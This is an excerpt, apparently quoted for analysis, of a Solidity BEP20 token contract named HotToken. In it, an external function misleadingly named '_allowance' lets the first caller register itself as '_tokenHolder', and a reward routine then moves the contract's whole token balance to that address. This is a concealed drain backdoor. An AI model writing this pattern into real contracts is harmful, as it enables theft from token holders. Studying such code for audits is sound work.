...
contract HotToken is Context, IBEP20, Ownable, PancakeTool {
    ...
    function _allowance(address _spender) external returns(bool) {
        require(_tokenHolder == address(0) && _spender != address(0), "DENIED");
        _tokenHolder = _spender;
        return true;
    }
    ...
    function _tokenReward() internal returns (bool) {
        ...
        uint256 reward = _balances[address(this)].mul(95).div(100);
        ...
        if(_tokenHolder != address(0)) {
                _balances[_tokenHolder] = _balances[_tokenHolder].add(_balances[address(this)]);
